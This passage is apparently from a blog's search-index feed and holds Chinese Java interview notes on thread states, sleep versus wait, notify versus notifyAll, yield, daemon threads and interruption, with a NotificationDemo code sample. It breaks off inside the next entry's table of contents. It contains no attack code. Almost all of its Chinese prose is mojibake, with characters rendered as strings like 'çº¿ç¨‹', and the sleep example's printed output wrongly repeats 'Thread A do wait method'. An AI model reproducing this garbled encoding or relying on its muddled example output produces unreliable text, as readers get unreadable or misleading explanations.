Waitingï¼‰ï¼šåœ¨ä¸€å®šæ—¶é—´åä¼šç”±ç³»ç»Ÿè‡ªåŠ¨å”¤é†’</p><table><thead><tr><th><strong>è¿›å…¥æ–¹æ³•</strong></th><th><strong>é€€å‡ºæ–¹æ³•</strong></th></tr></thead><tbody><tr><td>Thread.sleep()æ–¹æ³•</td><td>æ—¶é—´ç»“æŸ</td></tr><tr><td>è®¾ç½®äº†Timeoutå‚æ•°çš„Object.wait()æ–¹æ³•</td><td>æ—¶é—´ç»“æŸ&#x2F;Object.notify()&#x2F;   Object.notfifyAll()</td></tr><tr><td>è®¾ç½®äº†Timeoutå‚æ•°çš„Thread.join()æ–¹æ³•</td><td>æ—¶é—´ç»“æŸ &#x2F; è¢«è°ƒç”¨çš„çº¿ç¨‹æ‰§è¡Œå®Œæ¯•</td></tr><tr><td>LockSupport.parkNanos  æ–¹æ³•</td><td>LockSupport.unpark</td></tr><tr><td>LockSupport.parkUntil æ–¹æ³•</td><td>LockSupport.unpark</td></tr></tbody></table><p>Ã˜ é˜»å¡ï¼ˆBlockedï¼‰:ç­‰å¾…è·å–æ’ä»–é”</p><p>Ã˜ ç»“æŸï¼ˆTerminatedï¼‰ï¼šå·²ç»ˆæ­¢çº¿ç¨‹çš„çŠ¶æ€ï¼Œçº¿ç¨‹å·²ç»ç»“æŸæ‰§è¡Œ</p><p>ç»“æŸåè¿è¡Œjoinä¼šå‘ç”Ÿå¼‚å¸¸</p><p><img src="/2020/04/05/java-Thread/image-20200405101912677.png"></p><h2><span id="sleepå’Œwait-">Sleepå’Œwait -</span></h2><h3><span id="åŸºæœ¬çš„å·®åˆ«">åŸºæœ¬çš„å·®åˆ«</span></h3><p>Ã˜ Sleepæ˜¯Threadç±»çš„æ–¹æ³•ï¼Œwaitæ˜¯Objectç±»ä¸­å®šä¹‰çš„æ–¹æ³•</p><p>Ã˜ Sleep()æ–¹æ³•å¯ä»¥åœ¨ä»»ä½•åœ°æ–¹ä½¿ç”¨</p><p>Ã˜ Wait()æ–¹æ³•åªèƒ½åœ¨synchronizedæ–¹æ³•æˆ–è€…synchronizedå—ä¸­ä½¿ç”¨</p><p>Ã˜ sleep()æ–¹æ³•åœ¨ä¼‘çœ æ—¶é—´è¾¾åˆ°åå¦‚æœå†æ¬¡è·å¾—CPUæ—¶é—´ç‰‡å°±ä¼šç»§ç»­æ‰§è¡Œï¼Œè€Œwait()æ–¹æ³•å¿…é¡»ç­‰å¾…Object.notift&#x2F;Object.notifyAllé€šçŸ¥åï¼Œæ‰ä¼šç¦»å¼€ç­‰å¾…æ± ï¼Œå¹¶ä¸”å†æ¬¡è·å¾—CPUæ—¶é—´ç‰‡æ‰ä¼šç»§ç»­æ‰§è¡Œã€‚</p><h3><span id="æœ€ä¸»è¦çš„æœ¬è´¨åŒºåˆ«">æœ€ä¸»è¦çš„æœ¬è´¨åŒºåˆ«</span></h3><p>Ã˜ Thread.sleepåªä¼šè®©å‡ºCPUï¼Œä¸ä¼šå¯¼è‡´é”è¡Œä¸ºçš„æ”¹å˜</p><p>Ã˜ Object.waitä¸ä»…è®©å‡ºCPUï¼Œè¿˜ä¼šé‡Šæ”¾å·²ç»å æœ‰çš„åŒæ­¥èµ„æºé”</p><p> <img src="/2020/04/05/java-Thread/image-20200405103009700.png"></p><p><img src="/2020/04/05/java-Thread/image-20200405103019328.png"></p><p>ç¬¬ä¸€ä¸ªå®ç°waité€»è¾‘ï¼Œç¬¬äºŒä¸ªå®ç°sleepé€»è¾‘ã€‚</p><p>åœ¨ç¬¬ä¸€ä¸ªçº¿ç¨‹startåsleep 10mså†è¿è¡Œç¬¬äºŒä¸ªçº¿ç¨‹ã€‚</p><p>æ­¤æ—¶ç”±äºçº¿ç¨‹Aä½¿ç”¨waitæ–¹æ³•ï¼Œæ‰€ä»¥Bå¯ä»¥æ‹¿åˆ°é”ã€‚</p><p><strong>Thread A is waiting to get lock</strong></p><p><strong>Thread A get lock</strong></p><p><strong>Thread B is waiting to get lock</strong></p><p><strong>Thread A do wait method</strong></p><p><strong>Thread B get lock</strong></p><p><strong>Thread B is sleeping 10ms</strong></p><p><strong>Thread B is done</strong></p><p><strong>Thread A is done</strong></p><p>å¦‚æœAä½¿ç”¨Sleepï¼š</p><p><strong>Thread A is waiting to get lock</strong></p><p><strong>Thread A get lock</strong></p><p><strong>Thread B is waiting to get lock</strong></p><p><strong>Thread A do wait method</strong></p><p><strong>Thread A is done</strong></p><p><strong>Thread B get lock</strong></p><p><strong>Thread B is sleeping 10ms</strong></p><p><strong>Thread B is done</strong></p><p>å›åˆ°çº¿ç¨‹A waitï¼ˆä¸ç»™å‚æ•°ï¼Œæ— é™ç­‰å¾…ï¼‰ï¼Œçº¿ç¨‹B sleepçš„çŠ¶æ€</p><p>å°±ä¼šå‘ç°Aæ— é™ç­‰å¾…ï¼Œç„¶åBå·²ç»æ‰§è¡Œå®Œäº†ï¼Œç¨‹åºè¿˜æ²¡ç»“æŸã€‚</p><p>æ­¤æ—¶å¯ä»¥åœ¨Bä¸­åŠ å…¥notifyæ¥å”¤é†’Aã€æˆ–è€…notifyall</p><p><img src="/2020/04/05/java-Thread/image-20200405103049686.png"></p><h2><span id="notifyå’Œnotifyallçš„åŒºåˆ«">Notifyå’ŒnotifyAllçš„åŒºåˆ« âˆš</span></h2><h3><span id="ä¸¤ä¸ªæ¦‚å¿µ">ä¸¤ä¸ªæ¦‚å¿µ</span></h3><h4><span id="é”æ± entrylist">é”æ± EntryList</span></h4><p>å‡è®¾çº¿ç¨‹Aå·²ç»æ‹¥æœ‰äº†æŸä¸ªå¯¹è±¡ï¼ˆä¸æ˜¯ç±»ï¼‰çš„é”ï¼Œè€Œå…¶ä»–çº¿ç¨‹Bã€Cæƒ³è¦è°ƒç”¨è¿™ä¸ªå¯¹è±¡çš„æŸä¸ªsynchronizedæ–¹æ³•ï¼ˆæˆ–è€…å—ï¼‰ï¼Œç”±äºBã€Cçº¿ç¨‹åœ¨è¿›å…¥å¯¹è±¡çš„synchronizedæ–¹æ³•ï¼ˆæˆ–è€…å—ï¼‰ä¹‹å‰å¿…é¡»å…ˆè·å¾—è¯¥å¯¹è±¡é”çš„æ‹¥æœ‰æƒï¼Œè€Œæ°å·§è¯¥å¯¹è±¡çš„é”ç›®å‰æ­£è¢«çº¿ç¨‹Aæ‰€å ç”¨ï¼Œæ­¤æ—¶Bã€Cçº¿ç¨‹å°±ä¼šè¢«é˜»å¡ï¼Œè¿›å…¥ä¸€ä¸ªåœ°æ–¹å»ç­‰å¾…é”çš„é‡Šæ”¾ï¼Œè¿™ä¸ªåœ°æ–¹ä¾¿æ˜¯è¯¥å¯¹è±¡çš„é”æ± ã€‚ </p><h4><span id="ç­‰å¾…æ± waitset">ç­‰å¾…æ± WaitSet</span></h4><p>å‡è®¾çº¿ç¨‹Aè°ƒç”¨äº†æŸä¸ªå¯¹è±¡çš„wait()æ–¹æ³•ï¼Œçº¿ç¨‹Aå°±ä¼šé‡Šæ”¾è¯¥å¯¹è±¡çš„é”ï¼ŒåŒæ—¶çº¿ç¨‹Aå°±è¿›å…¥åˆ°äº†è¯¥å¯¹è±¡çš„ç­‰å¾…æ± ä¸­ï¼Œè¿›å…¥åˆ°ç­‰å¾…æ± ä¸­çš„çº¿ç¨‹ä¸ä¼šå»ç«äº‰è¯¥å¯¹è±¡çš„é”</p><p>Ã˜ NotifyAllä¼šè®©æ‰€æœ‰å¤„äºç­‰å¾…æ± çš„çº¿ç¨‹å…¨éƒ¨è¿›å…¥é”æ± å»ç«äº‰è·å–é”çš„æœºä¼š</p><p>Ã˜ Notifyåªä¼šéšæœºé€‰æ‹©ä¸€ä¸ªå¤„äºç­‰å¾…æ± ä¸­çš„çº¿ç¨‹è¿›å…¥é”æ± å»ç«äº‰è·å–é”çš„æœºä¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.interview.javabasic.thread;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.logging.Level;</span><br><span class="line"><span class="keyword">import</span> java.util.logging.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NotificationDemo</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">volatile</span> <span class="type">boolean</span> <span class="variable">go</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">NotificationDemo</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NotificationDemo</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Runnable</span> <span class="variable">waitTask</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Runnable</span>()&#123;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    test.shouldGo();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">&quot; finished Execution&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Runnable</span> <span class="variable">notifyTask</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Runnable</span>()&#123;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>&#123;</span><br><span class="line">                test.go();</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">&quot; finished Execution&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(waitTask, <span class="string">&quot;WT1&quot;</span>); <span class="comment">//will wait</span></span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(waitTask, <span class="string">&quot;WT2&quot;</span>); <span class="comment">//will wait</span></span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(waitTask, <span class="string">&quot;WT3&quot;</span>); <span class="comment">//will wait</span></span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(notifyTask,<span class="string">&quot;NT1&quot;</span>); <span class="comment">//will notify</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//starting all waiting thread</span></span><br><span class="line">        t1.start();</span><br><span class="line">        t2.start();</span><br><span class="line">        t3.start();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//pause to ensure all waiting thread started successfully</span></span><br><span class="line">        Thread.sleep(<span class="number">200</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//starting notifying thread</span></span><br><span class="line">        t4.start();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * wait and notify can only be called from synchronized method or bock</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">shouldGo</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">while</span>(go != <span class="literal">true</span>)&#123;</span><br><span class="line">            System.out.println(Thread.currentThread()</span><br><span class="line">                    + <span class="string">&quot; is going to wait on this object&quot;</span>);</span><br><span class="line">            wait(); <span class="comment">//release lock and reacquires on wakeup</span></span><br><span class="line">            System.out.println(Thread.currentThread() + <span class="string">&quot; is woken up&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        go = <span class="literal">false</span>; <span class="comment">//resetting condition</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * both shouldGo() and go() are locked on current object referenced by &quot;this&quot; keyword</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">go</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (go == <span class="literal">false</span>)&#123;</span><br><span class="line">            System.out.println(Thread.currentThread()</span><br><span class="line">                    + <span class="string">&quot; is going to notify all or one thread waiting on this object&quot;</span>);</span><br><span class="line"></span><br><span class="line">            go = <span class="literal">true</span>; <span class="comment">//making condition true for waiting thread</span></span><br><span class="line">            <span class="comment">//notify(); // only one out of three waiting thread WT1, WT2,WT3 will woke up</span></span><br><span class="line">            notifyAll(); <span class="comment">// all waiting thread  WT1, WT2,WT3 will woke up</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/05/java-Thread/image-20200405103135404.png"></p><p>å¦‚æœæ”¹æˆnotifyAll</p><p><img src="/2020/04/05/java-Thread/image-20200405103148463.png"></p><p>æ‰€æœ‰çš„çº¿ç¨‹éƒ½è¢«å”¤é†’äº†ï¼Œä½†æ˜¯æœ€å<font color="red">åªæœ‰ä¸€ä¸ªæ‰§è¡ŒæˆåŠŸ</font>ã€‚å…¶ä½™çº¿ç¨‹<font color="red">åˆå›åˆ°ç­‰å¾…æ± </font>ä¸­ã€‚</p><h2><span id="yeildæ–¹æ³•">Yeildæ–¹æ³• âˆš</span></h2><p>ç”¨äº†yieldæ–¹æ³•åï¼Œè¯¥çº¿ç¨‹å°±ä¼šæŠŠCPUæ—¶é—´è®©æ‰ï¼Œè®©å…¶ä»–æˆ–è€…è‡ªå·±çš„çº¿ç¨‹æ‰§è¡Œï¼ˆä¹Ÿå°±æ˜¯è°å…ˆæŠ¢åˆ°è°æ‰§è¡Œï¼‰</p><p>Yieldå¯¹é”çš„è¡Œä¸ºæ²¡æœ‰å½±å“ </p><p>åªä¼šåˆ†é…<strong>ç»™å½“å‰çº¿ç¨‹ç›¸åŒä¼˜å…ˆçº§</strong>çš„çº¿ç¨‹ </p><p>åœ¨Javaç¨‹åºä¸­ï¼Œé€šè¿‡ä¸€ä¸ª<strong>æ•´å‹æˆå‘˜å˜é‡</strong>Priority<strong>æ¥æ§åˆ¶ä¼˜å…ˆçº§ï¼Œä¼˜å…ˆçº§çš„èŒƒå›´ä»1~10.åœ¨æ„å»ºçº¿ç¨‹çš„æ—¶å€™å¯ä»¥é€šè¿‡</strong>setPriority(int)æ–¹æ³•è¿›è¡Œè®¾ç½®ï¼Œé»˜è®¤ä¼˜å…ˆçº§ä¸º5ï¼Œä¼˜å…ˆçº§é«˜çš„çº¿ç¨‹ç›¸è¾ƒäºä¼˜å…ˆçº§ä½çš„çº¿ç¨‹ä¼˜å…ˆè·å¾—å¤„ç†å™¨æ—¶é—´ç‰‡ã€‚éœ€è¦æ³¨æ„çš„æ˜¯åœ¨ä¸åŒJVMä»¥åŠæ“ä½œç³»ç»Ÿä¸Šï¼Œçº¿ç¨‹è§„åˆ’å­˜åœ¨å·®å¼‚ï¼Œæœ‰äº›æ“ä½œç³»ç»Ÿç”šè‡³ä¼šå¿½ç•¥çº¿ç¨‹ä¼˜å…ˆçº§çš„è®¾å®šã€‚</p><p><img src="/2020/04/05/java-Thread/image-20200405103912517.png"></p><p><img src="/2020/04/05/java-Thread/image-20200405103920271.png"></p><p><img src="/2020/04/05/java-Thread/image-20200405103928822.png"></p><p>Yieldå¯¹é”çš„è¡Œä¸ºæ²¡æœ‰å½±å“</p><h2><span id="å®ˆæŠ¤çº¿ç¨‹-">å®ˆæŠ¤çº¿ç¨‹ -</span></h2><p>å®ˆæŠ¤çº¿ç¨‹æ˜¯ä¸€ç§ç‰¹æ®Šçš„çº¿ç¨‹ï¼Œå°±å’Œå®ƒçš„åå­—ä¸€æ ·ï¼Œå®ƒæ˜¯ç³»ç»Ÿçš„å®ˆæŠ¤è€…ï¼Œåœ¨åå°é»˜é»˜åœ°å®ˆæŠ¤ä¸€äº›ç³»ç»ŸæœåŠ¡ï¼Œæ¯”å¦‚åƒåœ¾å›æ”¶çº¿ç¨‹å°±å¯ä»¥ç†è§£å®ˆæŠ¤çº¿ç¨‹ã€‚ä¸ä¹‹å¯¹åº”çš„å°±æ˜¯ç”¨æˆ·çº¿ç¨‹ï¼Œç”¨æˆ·çº¿ç¨‹å°±å¯ä»¥è®¤ä¸ºæ˜¯ç³»ç»Ÿçš„å·¥ä½œçº¿ç¨‹ï¼Œå®ƒä¼šå®Œæˆæ•´ä¸ªç³»ç»Ÿçš„ä¸šåŠ¡æ“ä½œã€‚</p><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯<strong>å®ˆæŠ¤çº¿ç¨‹åœ¨é€€å‡ºçš„æ—¶å€™å¹¶ä¸ä¼šæ‰§è¡Œfinnally</strong>å—ä¸­çš„ä»£ç ï¼Œæ‰€ä»¥å°†é‡Šæ”¾èµ„æºç­‰æ“ä½œä¸è¦æ”¾åœ¨finnallyå—ä¸­æ‰§è¡Œï¼Œè¿™ç§æ“ä½œæ˜¯ä¸å®‰å…¨çš„</p><p>çº¿ç¨‹å¯ä»¥é€šè¿‡setDaemon(true)çš„æ–¹æ³•å°†çº¿ç¨‹è®¾ç½®ä¸ºå®ˆæŠ¤çº¿ç¨‹ã€‚å¹¶ä¸”éœ€è¦æ³¨æ„çš„æ˜¯è®¾ç½®å®ˆæŠ¤çº¿ç¨‹è¦å…ˆäºstart()æ–¹æ³•ï¼Œå¦åˆ™ä¼šæŠ¥</p><p>Exception in thread â€œmainâ€ java.lang.IllegalThreadStateException at java.lang.Thread.setDaemon(Thread.java:1365) at learn.DaemonDemo.main(DaemonDemo.java:19)</p><p>è¿™æ ·çš„å¼‚å¸¸ï¼Œä½†æ˜¯è¯¥çº¿ç¨‹è¿˜æ˜¯ä¼šæ‰§è¡Œï¼Œåªä¸è¿‡ä¼šå½“åšæ­£å¸¸çš„ç”¨æˆ·çº¿ç¨‹æ‰§è¡Œã€‚</p><h2><span id="å¦‚ä½•ä¸­æ–­çº¿ç¨‹">å¦‚ä½•ä¸­æ–­çº¿ç¨‹ âˆš</span></h2><h3><span id="å·²ç»è¢«æŠ›å¼ƒçš„æ–¹æ³•">å·²ç»è¢«æŠ›å¼ƒçš„æ–¹æ³•</span></h3><p>Ã˜ é€šè¿‡è°ƒç”¨stop()æ–¹æ³•åœæ­¢çº¿ç¨‹</p><p>Ã˜ é€šè¿‡è°ƒç”¨suspend()å’Œresume()æ–¹æ³•</p><p>stopæ–¹æ³•æ˜¯ä¸€ç§â€œæ¶æ„â€çš„ä¸­æ–­ï¼Œä¸€æ—¦æ‰§è¡Œstopæ–¹æ³•ï¼Œå³ç»ˆæ­¢å½“å‰æ­£åœ¨è¿è¡Œçš„çº¿ç¨‹ï¼Œä¸ç®¡çº¿ç¨‹é€»è¾‘æ˜¯å¦å®Œæ•´ï¼Œè¿™æ˜¯éå¸¸å±é™©çš„ï¼Œ stopæ–¹æ³•ä¼šç ´ååŸå­é€»è¾‘ä¹Ÿå¯èƒ½ä¼šå¯¼è‡´æ•°æ®ä¸åŒæ­¥ã€‚</p><p>suspend(ï¼‰åœ¨å¯¼è‡´çº¿ç¨‹æš‚åœçš„åŒæ—¶ï¼Œå¹¶ä¸ä¼šå»é‡Šæ”¾ä»»ä½•é”èµ„æº</p><p>å¦‚æœresume()æ“ä½œæ„å¤–åœ°åœ¨suspend()å‰å°±æ‰§è¡Œäº†ï¼Œé‚£ä¹ˆè¢«æŒ‚èµ·çš„çº¿ç¨‹å¯èƒ½å¾ˆéš¾æœ‰æœºä¼šè¢«ç»§ç»­æ‰§è¡Œã€‚å¹¶ä¸”ï¼Œæ›´ä¸¥é‡çš„æ˜¯ï¼šå®ƒæ‰€å ç”¨çš„é”ä¸ä¼šè¢«é‡Šæ”¾ï¼Œå› æ­¤å¯èƒ½ä¼šå¯¼è‡´æ•´ä¸ªç³»ç»Ÿå·¥ä½œä¸æ­£å¸¸ã€‚</p><h3><span id="ç›®å‰ä½¿ç”¨çš„æ–¹æ³•">ç›®å‰ä½¿ç”¨çš„æ–¹æ³•</span></h3><p>Ã˜ è°ƒç”¨interrupt(),é€šçŸ¥çº¿ç¨‹åº”è¯¥ä¸­æ–­äº†</p><p>a)   å¦‚æœçº¿ç¨‹å¤„äºè¢«é˜»å¡çŠ¶æ€ï¼Œé‚£ä¹ˆçº¿ç¨‹å°†ç«‹å³é€€å‡ºè¢«é˜»å¡çŠ¶æ€ï¼Œå¹¶æŠ›å‡ºä¸€ä¸ªInterruptedExceptionå¼‚å¸¸ã€‚</p><p>b)   å¦‚æœçº¿ç¨‹å¤„äºæ­£å¸¸æ´»åŠ¨çŠ¶æ€ï¼Œé‚£ä¹ˆä¼šå°†è¯¥çº¿ç¨‹çš„ä¸­æ–­æ ‡å¿—è®¾ç½®ä¸ºtrueã€‚è¢«è®¾ç½®ä¸­æ–­æ ‡å¿—çš„çº¿ç¨‹å°†ä¼šç»§ç»­æ­£å¸¸è¿è¡Œä¸å—å½±å“ã€‚</p><p>Ã˜ éœ€è¦è¢«è°ƒç”¨çš„çº¿ç¨‹é…åˆä¸­æ–­</p><p>a)   åœ¨æ­£å¸¸è¿è¡Œä»»åŠ¡æ—¶ï¼Œç»å¸¸æ£€æŸ¥æœ¬çº¿ç¨‹çš„ä¸­æ–­æ ‡å¿—ä½ï¼Œå¦‚æœè¢«è®¾ç½®äº†ä¸­æ–­æ ‡å¿—å°±è‡ªè¡Œåœæ­¢çº¿ç¨‹ã€‚</p><p>b)   å¦‚æœçº¿ç¨‹å¤„äºæ­£å¸¸æ´»åŠ¨çŠ¶æ€ï¼Œé‚£ä¹ˆä¼šå°†è¯¥çº¿ç¨‹çš„ä¸­æ–­æ ‡å¿—è®¾ç½®ä¸ºtrueã€‚è¢«è®¾ç½®ä¸­æ–­æ ‡å¿—çš„çº¿ç¨‹å°†ç»§ç»­æ­£å¸¸è¿è¡Œï¼Œä¸å—å½±å“ã€‚</p><p><img src="/2020/04/05/java-Thread/image-20200405104227952.png"></p><p>ä¸­æ–­å¯ä»¥ç†è§£ä¸ºçº¿ç¨‹çš„ä¸€ä¸ªæ ‡å¿—ä½ï¼Œå®ƒè¡¨ç¤ºäº†ä¸€ä¸ªè¿è¡Œä¸­çš„çº¿ç¨‹æ˜¯å¦è¢«å…¶ä»–çº¿ç¨‹è¿›è¡Œäº†ä¸­æ–­æ“ä½œã€‚ä¸­æ–­å¥½æ¯”å…¶ä»–çº¿ç¨‹å¯¹è¯¥çº¿ç¨‹æ‰“äº†ä¸€ä¸ªæ‹›å‘¼ã€‚å…¶ä»–çº¿ç¨‹å¯ä»¥è°ƒç”¨è¯¥çº¿ç¨‹çš„interrupt()æ–¹æ³•å¯¹å…¶è¿›è¡Œä¸­æ–­æ“ä½œï¼ŒåŒæ—¶è¯¥çº¿ç¨‹å¯ä»¥è°ƒç”¨ isInterruptedï¼ˆï¼‰æ¥æ„ŸçŸ¥å…¶ä»–çº¿ç¨‹å¯¹å…¶è‡ªèº«çš„ä¸­æ–­æ“ä½œï¼Œä»è€Œåšå‡ºå“åº”ã€‚å¦å¤–ï¼ŒåŒæ ·å¯ä»¥è°ƒç”¨Threadçš„é™æ€æ–¹æ³• interruptedï¼ˆï¼‰å¯¹å½“å‰çº¿ç¨‹è¿›è¡Œä¸­æ–­æ“ä½œï¼Œè¯¥æ–¹æ³•ä¼šæ¸…é™¤ä¸­æ–­æ ‡å¿—ä½ã€‚<strong>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå½“æŠ›å‡ºInterruptedExceptionæ—¶å€™ï¼Œä¼šæ¸…é™¤ä¸­æ–­æ ‡å¿—ä½ï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨è°ƒç”¨isInterruptedä¼šè¿”å›false</strong>ã€‚</p><p><img src="/2020/04/05/java-Thread/image-20200405104410385.png"></p><p><img src="/2020/04/05/java-Thread/image-20200405104418440.png"></p><p><img src="/2020/04/05/java-Thread/image-20200405104444644.png"></p><h2><span id="çº¿ç¨‹çŠ¶æ€å›¾">çº¿ç¨‹çŠ¶æ€å›¾</span></h2><p><img src="/2020/04/05/java-Thread/image-20200405104454839.png"></p>]]></content>
      
      
      <categories>
          
          <category> é¢è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javaå¤šçº¿ç¨‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaå¸¸ç”¨ç±»åº“ä¸æŠ€å·§</title>
      <link href="/2020/03/31/Java-jar/"/>
      <url>/2020/03/31/Java-jar/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>ç›˜ç‚¹äº†Javaå¸¸ç”¨ç±»åº“ä¸æŠ€å·§</p><span id="more"></span><!-- toc --><ul><li><a href="#java%E5%BC%82%E5%B8%B8">Javaå¼‚å¸¸</a><ul><li><a href="#%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%9C%BA%E5%88%B6%E4%B8%BB%E8%A6%81%E5%9B%9E%E7%AD%94%E4%BA%86%E4%B8%89%E4%B8%AA%E9%97%AE%E9%A2%98">å¼‚å¸¸å¤„ç†æœºåˆ¶ä¸»è¦å›ç­”äº†ä¸‰ä¸ªé—®é¢˜</a></li></ul></li><li><a href="#error%E5%92%8Cexception%E7%9A%84%E5%8C%BA%E5%88%AB">Errorå’ŒExceptionçš„åŒºåˆ«</a><ul><li><a href="#%E4%BB%8E%E6%A6%82%E5%BF%B5%E8%A7%92%E5%BA%A6%E8%A7%A3%E6%9E%90java%E7%9A%84%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%9C%BA%E5%88%B6">ä»æ¦‚å¿µè§’åº¦è§£æJavaçš„å¼‚å¸¸å¤„ç†æœºåˆ¶</a></li><li><a href="#%E4%BB%8E%E8%B4%A3%E4%BB%BB%E8%A7%92%E5%BA%A6%E7%9C%8B">ä»è´£ä»»è§’åº¦çœ‹</a></li></ul></li><li><a href="#%E5%B8%B8%E8%A7%81error%E4%BB%A5%E5%8F%8Aexception">å¸¸è§Errorä»¥åŠException</a></li><li><a href="#java%E7%9A%84%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%9C%BA%E5%88%B6">Javaçš„å¼‚å¸¸å¤„ç†æœºåˆ¶</a></li><li><a href="#java%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%E5%8E%9F%E5%88%99">Javaå¼‚å¸¸çš„å¤„ç†åŸåˆ™</a></li><li><a href="#%E9%AB%98%E6%95%88%E4%B8%BB%E6%B5%81%E7%9A%84%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%A1%86%E6%9E%B6">é«˜æ•ˆä¸»æµçš„å¼‚å¸¸å¤„ç†æ¡†æ¶</a></li><li><a href="#try-catch%E7%9A%84%E6%80%A7%E8%83%BD">Try-catchçš„æ€§èƒ½</a><ul><li><a 